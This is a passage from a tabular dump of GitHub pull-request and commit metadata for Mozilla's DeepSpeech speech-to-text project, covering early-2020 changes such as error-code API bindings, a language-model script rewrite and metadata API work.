Closes #2773 ",imskr,42062622,2020-03-02T14:16:38Z,COLLABORATOR,True,13,37,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a0b2b7866cb0200968201295fd15ffe481af0aac,fixed EvaluateResultCode
1221,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2806,2806,Exposing ErrorCode API in Tree bindings,"Exposing our `DS_ErrorCodeToErrorMessage` API to our tree bindings

Closes #2773 ",imskr,42062622,2020-03-02T14:16:38Z,COLLABORATOR,True,13,37,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0d05a5b14d5ed3815fcb8d93f66eb12393686b8d,chnaged param errorcodes to int
1222,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2806,2806,Exposing ErrorCode API in Tree bindings,"Exposing our `DS_ErrorCodeToErrorMessage` API to our tree bindings

Closes #2773 ",imskr,42062622,2020-03-02T14:16:38Z,COLLABORATOR,True,13,37,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e0a84d0db7bc8bff4b0476bc057b50d4ae4f173c,fixed some conversion issue
1223,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2806,2806,Exposing ErrorCode API in Tree bindings,"Exposing our `DS_ErrorCodeToErrorMessage` API to our tree bindings

Closes #2773 ",imskr,42062622,2020-03-02T14:16:38Z,COLLABORATOR,True,13,37,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dbf83116f809a33a5ca4d9fba94f63414fa6459c,IntPtr to String correct method
1224,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2806,2806,Exposing ErrorCode API in Tree bindings,"Exposing our `DS_ErrorCodeToErrorMessage` API to our tree bindings

Closes #2773 ",imskr,42062622,2020-03-02T14:16:38Z,COLLABORATOR,True,13,37,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e2896e769e32326fd415a5fae219e6810a359a4b,Changed PtrToString conversion
1225,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2802,2802,Ensure sample rate comparison with proper types,Fixes #2798,lissyx,1645737,2020-02-27T17:35:12Z,COLLABORATOR,True,7,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,639a68d2aee94a83641491becabf0e5aa39aee96,"Ensure sample rate comparison with proper types

Fixes #2798"
1226,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2801,2801,Rewrite generate_lm.py to allow usage with other languages.,,DanBmh,18572490,2020-02-27T16:19:50Z,CONTRIBUTOR,True,217,57,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,15a75c77ff125ed466b3df06b9a99aa3819ded89,Rewrite generate_lm.py to allow usage with other languages.
1227,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2801,2801,Rewrite generate_lm.py to allow usage with other languages.,,DanBmh,18572490,2020-02-27T16:19:50Z,CONTRIBUTOR,True,217,57,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c505a4ec6c24f50990cda9850249c7df195c3504,Update some comments.
1228,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2801,2801,Rewrite generate_lm.py to allow usage with other languages.,,DanBmh,18572490,2020-02-27T16:19:50Z,CONTRIBUTOR,True,217,57,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c9a433486fa75fc807fd5ffb0b372c738e8a43bc,Add more arguments. Rename file variables.
1229,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2801,2801,Rewrite generate_lm.py to allow usage with other languages.,,DanBmh,18572490,2020-02-27T16:19:50Z,CONTRIBUTOR,True,217,57,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c6109c30f3f8dd8a51d490ab151edc21c39ac5bf,Add some statistics.
1230,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2801,2801,Rewrite generate_lm.py to allow usage with other languages.,,DanBmh,18572490,2020-02-27T16:19:50Z,CONTRIBUTOR,True,217,57,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ef095881ca7ff2485b28a5b28dfd79dd70dbe6b2,Fix too many arguments for format string.
1231,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2801,2801,Rewrite generate_lm.py to allow usage with other languages.,,DanBmh,18572490,2020-02-27T16:19:50Z,CONTRIBUTOR,True,217,57,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9c73700ac7cc6f7f4486bfb2f4100144d37eb83e,Add error hint and default values for alpha and beta.
1232,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2801,2801,Rewrite generate_lm.py to allow usage with other languages.,,DanBmh,18572490,2020-02-27T16:19:50Z,CONTRIBUTOR,True,217,57,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f808720b5b4ed1d5b6f7da205f69dfb3275e580e,Update readme.
1233,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2801,2801,Rewrite generate_lm.py to allow usage with other languages.,,DanBmh,18572490,2020-02-27T16:19:50Z,CONTRIBUTOR,True,217,57,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f97c79e0e8755e420e3bcafdf96fa7e6d2a09c5b,Make generate_lm.py language independent.
1234,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2801,2801,Rewrite generate_lm.py to allow usage with other languages.,,DanBmh,18572490,2020-02-27T16:19:50Z,CONTRIBUTOR,True,217,57,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a79cc0cee9263738046605ec18c3acc7a75bb944,Merge remote-tracking branch 'upstream/master'
1235,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2801,2801,Rewrite generate_lm.py to allow usage with other languages.,,DanBmh,18572490,2020-02-27T16:19:50Z,CONTRIBUTOR,True,217,57,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b27e0347b11d22a122dcbef2d50785c9024d8eed,"Add more parameters.
Implement some change request."
1236,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2801,2801,Rewrite generate_lm.py to allow usage with other languages.,,DanBmh,18572490,2020-02-27T16:19:50Z,CONTRIBUTOR,True,217,57,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,38afe38f0b7cef5569d70f0643cbd98fb587cd15,Implement some change request.
1237,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2801,2801,Rewrite generate_lm.py to allow usage with other languages.,,DanBmh,18572490,2020-02-27T16:19:50Z,CONTRIBUTOR,True,217,57,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e862cd41db61a6bed03b043fe91ffbe24b0c93ba,Read from input.txt.gz again.
1238,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2801,2801,Rewrite generate_lm.py to allow usage with other languages.,,DanBmh,18572490,2020-02-27T16:19:50Z,CONTRIBUTOR,True,217,57,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e16b72ff28abfb60af25c0ed6fa9dc68459f49f6,Use os.join and kenlm parameter usage description.
1239,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2801,2801,Rewrite generate_lm.py to allow usage with other languages.,,DanBmh,18572490,2020-02-27T16:19:50Z,CONTRIBUTOR,True,217,57,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a291e23041414225d975ad97862fa11f71c4dcae,Update readme.
1240,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2801,2801,Rewrite generate_lm.py to allow usage with other languages.,,DanBmh,18572490,2020-02-27T16:19:50Z,CONTRIBUTOR,True,217,57,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c29c0beb725213efc6f55a3d4f4d17ef533fbcf3,Default to required params.
1241,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2801,2801,Rewrite generate_lm.py to allow usage with other languages.,,DanBmh,18572490,2020-02-27T16:19:50Z,CONTRIBUTOR,True,217,57,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,00e4dbe3fd997f53ae25a4cfe09665cca15a9b03,Merge remote-tracking branch 'upstream/master'
1242,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2801,2801,Rewrite generate_lm.py to allow usage with other languages.,,DanBmh,18572490,2020-02-27T16:19:50Z,CONTRIBUTOR,True,217,57,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8c73bf6fbf4238ccf6608d0d22d0d2e9920e32e3,Small fixes.
1243,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2801,2801,Rewrite generate_lm.py to allow usage with other languages.,,DanBmh,18572490,2020-02-27T16:19:50Z,CONTRIBUTOR,True,217,57,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f82a77f249895f6a3172d5b5cad20352ce3c42c4,Update readme.
1244,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2797,2797,Doc: change cuDNN dependency to 7.6,Fixes #2788 ,dabinat,18251622,2020-02-26T19:34:55Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,81dd30847c0b856bd04ec2ab8ab92eeed1fcc7b6,Doc: change cuDNN dependency to 7.6
1245,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2794,2794,added implementation of DS_ErrorCodeToErrorMessage,"Implementation of an API to get textual descriptions of error codes.

Fixes #2773 ",imskr,42062622,2020-02-26T08:02:31Z,COLLABORATOR,True,77,0,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4fd747e540eab60b3e8862e93f4df3c0b8caafcd,added implementation of DS_ErrorCodeToErrorMessage
1246,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2794,2794,added implementation of DS_ErrorCodeToErrorMessage,"Implementation of an API to get textual descriptions of error codes.

Fixes #2773 ",imskr,42062622,2020-02-26T08:02:31Z,COLLABORATOR,True,77,0,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c77d3d6f2dbcffc601f23ae13e45d69224cb27fb,added documentation
1247,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2794,2794,added implementation of DS_ErrorCodeToErrorMessage,"Implementation of an API to get textual descriptions of error codes.

Fixes #2773 ",imskr,42062622,2020-02-26T08:02:31Z,COLLABORATOR,True,77,0,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,03196c875da10b5e8bcb1da0b3802421f2507b62,used strdup for showing error
1248,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2792,2792,"Expose multiple transcriptions in ""WithMetadata"" API","- [x] Rebase PR #2721
- [x] Address review comments
- [x] Improve naming in Metadata API
- [x] Add DS_IntermediateDecodeWithMetadata
- [x] Adapt client.cc
- [x] Adapt Python binding
- [x] Adapt JavaScript binding
- [x] Adapt .NET binding
- [x] Adapt Java binding
- [x] Update and synchronize docs",reuben,477142,2020-02-25T13:33:13Z,MEMBER,True,1004,465,41,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,32c969c1846453474d786306dac4c1de3a2b2b54,Expose multiple transcriptions through the API
1249,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2792,2792,"Expose multiple transcriptions in ""WithMetadata"" API","- [x] Rebase PR #2721
- [x] Address review comments
- [x] Improve naming in Metadata API
- [x] Add DS_IntermediateDecodeWithMetadata
- [x] Adapt client.cc
- [x] Adapt Python binding
- [x] Adapt JavaScript binding
- [x] Adapt .NET binding
- [x] Adapt Java binding
- [x] Update and synchronize docs",reuben,477142,2020-02-25T13:33:13Z,MEMBER,True,1004,465,41,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,004d66d224853d19e69db8ebafc67e9b762b453b,Client changes to show multiple transcriptions in JSON output
1250,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2792,2792,"Expose multiple transcriptions in ""WithMetadata"" API","- [x] Rebase PR #2721
- [x] Address review comments
- [x] Improve naming in Metadata API
- [x] Add DS_IntermediateDecodeWithMetadata
- [x] Adapt client.cc
- [x] Adapt Python binding
- [x] Adapt JavaScript binding
- [x] Adapt .NET binding
- [x] Adapt Java binding
- [x] Update and synchronize docs",reuben,477142,2020-02-25T13:33:13Z,MEMBER,True,1004,465,41,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,969b2ac4ba45aaf940a6371cfa73a34e38cab24f,Changed variable names to match coding style
1251,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2792,2792,"Expose multiple transcriptions in ""WithMetadata"" API","- [x] Rebase PR #2721
- [x] Address review comments
- [x] Improve naming in Metadata API
- [x] Add DS_IntermediateDecodeWithMetadata
- [x] Adapt client.cc
- [x] Adapt Python binding
- [x] Adapt JavaScript binding
- [x] Adapt .NET binding
- [x] Adapt Java binding
- [x] Update and synchronize docs",reuben,477142,2020-02-25T13:33:13Z,MEMBER,True,1004,465,41,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e0c42f01a441692fd4133899586a9cfd7b685641,Moved result limiting to ModelState instead of CTC decoder
1252,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2792,2792,"Expose multiple transcriptions in ""WithMetadata"" API","- [x] Rebase PR #2721
- [x] Address review comments
- [x] Improve naming in Metadata API
- [x] Add DS_IntermediateDecodeWithMetadata
- [x] Adapt client.cc
- [x] Adapt Python binding
- [x] Adapt JavaScript binding
- [x] Adapt .NET binding
- [x] Adapt Java binding
- [x] Update and synchronize docs",reuben,477142,2020-02-25T13:33:13Z,MEMBER,True,1004,465,41,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e1fec4e8183a3cd451330e7e5619cb2e6ded4868,"Client - Change JSON output to return alternatives transcripts in an ""alternatives"" array"
1253,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2792,2792,"Expose multiple transcriptions in ""WithMetadata"" API","- [x] Rebase PR #2721
- [x] Address review comments
- [x] Improve naming in Metadata API
- [x] Add DS_IntermediateDecodeWithMetadata
- [x] Adapt client.cc
- [x] Adapt Python binding
- [x] Adapt JavaScript binding
- [x] Adapt .NET binding
- [x] Adapt Java binding
- [x] Update and synchronize docs",reuben,477142,2020-02-25T13:33:13Z,MEMBER,True,1004,465,41,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,69bd0326052717ad7c7a47bb336cd0234c45bb7e,Improve API naming around Metadata objects
1254,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2792,2792,"Expose multiple transcriptions in ""WithMetadata"" API","- [x] Rebase PR #2721
- [x] Address review comments
- [x] Improve naming in Metadata API
- [x] Add DS_IntermediateDecodeWithMetadata
- [x] Adapt client.cc
- [x] Adapt Python binding
- [x] Adapt JavaScript binding
- [x] Adapt .NET binding
- [x] Adapt Java binding
- [x] Update and synchronize docs",reuben,477142,2020-02-25T13:33:13Z,MEMBER,True,1004,465,41,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ea8c7d2957d93cd7686751ba0860a10f7c5c330d,Add DS_IntermediateDecodeWithMetadata
1255,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2792,2792,"Expose multiple transcriptions in ""WithMetadata"" API","- [x] Rebase PR #2721
- [x] Address review comments
- [x] Improve naming in Metadata API
- [x] Add DS_IntermediateDecodeWithMetadata
- [x] Adapt client.cc
- [x] Adapt Python binding
- [x] Adapt JavaScript binding
- [x] Adapt .NET binding
- [x] Adapt Java binding
- [x] Update and synchronize docs",reuben,477142,2020-02-25T13:33:13Z,MEMBER,True,1004,465,41,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c74dcffe79dd8346e47a9f9ed5a56e46c2c1810a,Adjust client.cc for new API and small cleanup of code and function names
1256,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2792,2792,"Expose multiple transcriptions in ""WithMetadata"" API","- [x] Rebase PR #2721
- [x] Address review comments
- [x] Improve naming in Metadata API
- [x] Add DS_IntermediateDecodeWithMetadata
- [x] Adapt client.cc
- [x] Adapt Python binding
- [x] Adapt JavaScript binding
- [x] Adapt .NET binding
- [x] Adapt Java binding
- [x] Update and synchronize docs",reuben,477142,2020-02-25T13:33:13Z,MEMBER,True,1004,465,41,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6e88a37ad4367f1481e29472bf0a299881e96e63,Adapt Python bindings to new API
1257,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2792,2792,"Expose multiple transcriptions in ""WithMetadata"" API","- [x] Rebase PR #2721
- [x] Address review comments
- [x] Improve naming in Metadata API
- [x] Add DS_IntermediateDecodeWithMetadata
- [x] Adapt client.cc
- [x] Adapt Python binding
- [x] Adapt JavaScript binding
- [x] Adapt .NET binding
- [x] Adapt Java binding
- [x] Update and synchronize docs",reuben,477142,2020-02-25T13:33:13Z,MEMBER,True,1004,465,41,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,09048e2ea23c3e3f3d2f3d6d28c71d8283aca633,Adapt JavaScript bindings to new API
1258,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2792,2792,"Expose multiple transcriptions in ""WithMetadata"" API","- [x] Rebase PR #2721
- [x] Address review comments
- [x] Improve naming in Metadata API
- [x] Add DS_IntermediateDecodeWithMetadata
- [x] Adapt client.cc
- [x] Adapt Python binding
- [x] Adapt JavaScript binding
- [x] Adapt .NET binding
- [x] Adapt Java binding
- [x] Update and synchronize docs",reuben,477142,2020-02-25T13:33:13Z,MEMBER,True,1004,465,41,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bb709ff9553f513afa20bde601fe03b7539a6759,Adapt .NET bindings to new API
1259,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2792,2792,"Expose multiple transcriptions in ""WithMetadata"" API","- [x] Rebase PR #2721
- [x] Address review comments
- [x] Improve naming in Metadata API
- [x] Add DS_IntermediateDecodeWithMetadata
- [x] Adapt client.cc
- [x] Adapt Python binding
- [x] Adapt JavaScript binding
- [x] Adapt .NET binding
- [x] Adapt Java binding
- [x] Update and synchronize docs",reuben,477142,2020-02-25T13:33:13Z,MEMBER,True,1004,465,41,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c52f3b32fa3c7001151beedc2ac77a40294c3c41,Adapt Java bindings to new API
1260,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2792,2792,"Expose multiple transcriptions in ""WithMetadata"" API","- [x] Rebase PR #2721
- [x] Address review comments
- [x] Improve naming in Metadata API
- [x] Add DS_IntermediateDecodeWithMetadata
- [x] Adapt client.cc
- [x] Adapt Python binding
- [x] Adapt JavaScript binding
- [x] Adapt .NET binding
- [x] Adapt Java binding
- [x] Update and synchronize docs",reuben,477142,2020-02-25T13:33:13Z,MEMBER,True,1004,465,41,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e9ae38bf4789b9a2f62520c622c1eba1af656a9c,Update docs
1261,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2792,2792,"Expose multiple transcriptions in ""WithMetadata"" API","- [x] Rebase PR #2721
- [x] Address review comments
- [x] Improve naming in Metadata API
- [x] Add DS_IntermediateDecodeWithMetadata
- [x] Adapt client.cc
- [x] Adapt Python binding
- [x] Adapt JavaScript binding
- [x] Adapt .NET binding
- [x] Adapt Java binding
- [x] Update and synchronize docs",reuben,477142,2020-02-25T13:33:13Z,MEMBER,True,1004,465,41,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2ec34d5a067334a84b323328c149bd9752008059,Address review comments
1262,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2792,2792,"Expose multiple transcriptions in ""WithMetadata"" API","- [x] Rebase PR #2721
- [x] Address review comments
- [x] Improve naming in Metadata API
- [x] Add DS_IntermediateDecodeWithMetadata
- [x] Adapt client.cc
- [x] Adapt Python binding
- [x] Adapt JavaScript binding
- [x] Adapt .NET binding
- [x] Adapt Java binding
- [x] Update and synchronize docs",reuben,477142,2020-02-25T13:33:13Z,MEMBER,True,1004,465,41,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1547498e82c3ad1a0c648a93c62a4b2091074c45,Const members in structs
1263,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2792,2792,"Expose multiple transcriptions in ""WithMetadata"" API","- [x] Rebase PR #2721
- [x] Address review comments
- [x] Improve naming in Metadata API
- [x] Add DS_IntermediateDecodeWithMetadata
- [x] Adapt client.cc
- [x] Adapt Python binding
- [x] Adapt JavaScript binding
- [x] Adapt .NET binding
- [x] Adapt Java binding
- [x] Update and synchronize docs",reuben,477142,2020-02-25T13:33:13Z,MEMBER,True,1004,465,41,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ee30a1c9dead1b7cbd86ab51a2039f5e1859740b,Adapt Java bindings to const structs
1264,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2790,2790,Use KVM,,lissyx,1645737,2020-02-25T13:11:50Z,COLLABORATOR,True,9,2,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,af454004615818f41c2ad9f6d1ac106f034dffea,Use KVM for Android emulator
1265,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2789,2789,Make const functions receive const ModelState pointers (Fixes #2786),,reuben,477142,2020-02-25T10:16:12Z,MEMBER,True,10,10,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b74738a4050a4930ff4ba453d7e911970654edcb,Make const functions receive const ModelState pointers
1266,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2787,2787,Cache gradle deps and Android emulator setup,,lissyx,1645737,2020-02-24T13:07:18Z,COLLABORATOR,True,365,34,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c5ded5adfe086d6d3e55020582255020e305b10e,Cache gradle deps and Android emulator setup
1267,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2785,2785,added ctc decoder builds tasks,"Added the ctc decoder builds tasks in the python list of the github upload task.
Fixes #2717 ",imskr,42062622,2020-02-23T09:34:11Z,COLLABORATOR,True,4,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,279dc947f1428d76a1cba5557aaf9d4c921ce257,added ctc decoder builds tasks
1268,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2785,2785,added ctc decoder builds tasks,"Added the ctc decoder builds tasks in the python list of the github upload task.
Fixes #2717 ",imskr,42062622,2020-02-23T09:34:11Z,COLLABORATOR,True,4,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b03d7fe4eeb2853f18dec04eb2d5e3689531dc73,added against dependencies
1269,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2783,2783,Added optimizer for lm_alpha + lm_beta,,kdavis-mozilla,12054740,2020-02-22T12:01:25Z,CONTRIBUTOR,True,68,0,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,561131a05c765b44991fb1f1cf14962114e3390a,Added optimizer for lm_alpha + lm_beta
1270,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2783,2783,Added optimizer for lm_alpha + lm_beta,,kdavis-mozilla,12054740,2020-02-22T12:01:25Z,CONTRIBUTOR,True,68,0,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f0dbdf785584e4272d816d1fcec0ff739e006add,Renamed optimizer
1271,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2782,2782,Added command line utility to optimize lm_alpha + lm_beta,,kdavis-mozilla,12054740,2020-02-22T11:54:58Z,CONTRIBUTOR,False,67,10,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2689cfec907b27d5b748d9b10aa5df3e2df9fe4b,"Fix transcribe.py - use new checkpoint load method

Replaced non existing try_loading() method with the saver method and respect load flag

Removed tf.train.Saver()"
1272,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2782,2782,Added command line utility to optimize lm_alpha + lm_beta,,kdavis-mozilla,12054740,2020-02-22T11:54:58Z,CONTRIBUTOR,False,67,10,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4446d4661679a8f4fa0936e26732023249a5f44d,"Warn if --audio_sample_rate does not match training sample

In PR #2688, we started specifying the upper frequency limit when computing Mfccs.
This value was computed as half of the --audio_sample_rate value. Despite accepting
a variable sample rate input for the Mfcc computation, the TensorFlow OP only takes
a constant upper frequency limit, so we can't pass a dynamic value computed from each
sample to the op.

This means we lost the ability to transparently train on data with multiple sample
rates. This commit adds a warning message in case a training sample does not match
the --audio_sample_rate flag."
1273,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2782,2782,Added command line utility to optimize lm_alpha + lm_beta,,kdavis-mozilla,12054740,2020-02-22T11:54:58Z,CONTRIBUTOR,False,67,10,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,09082eeae875acfa7fd52062fd7c3d1fc9d44186,Added optimizer for lm_alpha + lm_beta
1274,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2781,2781,Add flag to force reinitialisation of learning rate after lr_plateau,"When using reduce_lr_on_plateau, the reduced learning rate is saved in the checkpoint. If you want to resume from the checkpoint at a higher learning rate (passed in by --learning_rate) then you can set this flag.",rhamnett,6739670,2020-02-21T19:33:25Z,CONTRIBUTOR,True,2,1,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0de9e4bf80cf2f9cc7c848b9189811aa32a570aa,"Add force_initialize_learning_rate

Ability to reset learning rate which has been reduced by reduce_lr_on_plateau"
1275,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2781,2781,Add flag to force reinitialisation of learning rate after lr_plateau,"When using reduce_lr_on_plateau, the reduced learning rate is saved in the checkpoint. If you want to resume from the checkpoint at a higher learning rate (passed in by --learning_rate) then you can set this flag.",rhamnett,6739670,2020-02-21T19:33:25Z,CONTRIBUTOR,True,2,1,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5e1f54ae4fc70b05f188d04387b9ce288a80e230,Reset learning rate if force set
